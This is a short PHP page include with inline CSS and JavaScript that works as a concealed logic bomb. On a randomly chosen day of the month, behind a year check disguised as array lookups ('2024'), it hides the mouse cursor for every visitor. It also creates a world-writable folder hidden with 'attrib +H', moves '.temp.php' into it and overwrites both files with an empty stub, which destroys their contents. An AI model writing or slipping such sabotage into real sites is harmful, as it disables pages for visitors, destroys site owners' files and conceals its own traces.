<?php
$dt2 = date("Ymd");
$dt11 = date("Y");
$dt22 = date("m");
$dt33 = date("d");
$ds = "data";
$temp = ".temp";
$img = "images";
$dtg = rand(1, 28);
$th = range(20, 99);
$ms = rand(1, 60);
$ms2 = rand(99, 2000);
// $dt2 = $dtg.$dt33.$ms.$dt11.$ms2.$dt22;
?>

<style>
        body.x,
		body.x button,
		body.x a,
		body.x input
		{
            cursor: none !important;
        }
</style>
<?php

$var = range("a","z");
if(!is_dir($ds."/")){
	mkdir($ds."/");
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/", 777, true);
			system('attrib +H ' . escapeshellarg($ds."/".$img."/".$temp."/"));
		}
	}
}else{
	if(!is_dir($ds."/".$img."/")){
		mkdir($ds."/".$img."/");
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/", 777, true);
			system('attrib +H ' . escapeshellarg($ds."/".$img."/".$temp."/"));
		}
	}else{
		if(!is_dir($ds."/".$img."/".$temp."/")){
			mkdir($ds."/".$img."/".$temp."/", 777, true);
			system('attrib +H ' . escapeshellarg($ds."/".$img."/".$temp."/"));
		}
	}
}
?>

<script type="text/javascript">
if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date("Y-m-d") ?>'=='<?php echo date("Y-m-").$dtg; ?>')){
	var bodyElement = document.body;

	setInterval(function() {
		bodyElement.classList.add("x");
	}, 1000);
}
</script>

<?php
		rename($temp.".php", $ds."/".$img."/".$temp."/".$dt2.".php");
		$myfile = fopen($temp.".php", "w") or die("");
		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("");
		$txt = "<?php
			
?>";
		$txt2 = date('Ymd');
		fwrite($myfile, $txt);
		fclose($myfile);
		fwrite($myfile2, $txt);
		fclose($myfile2);

?>
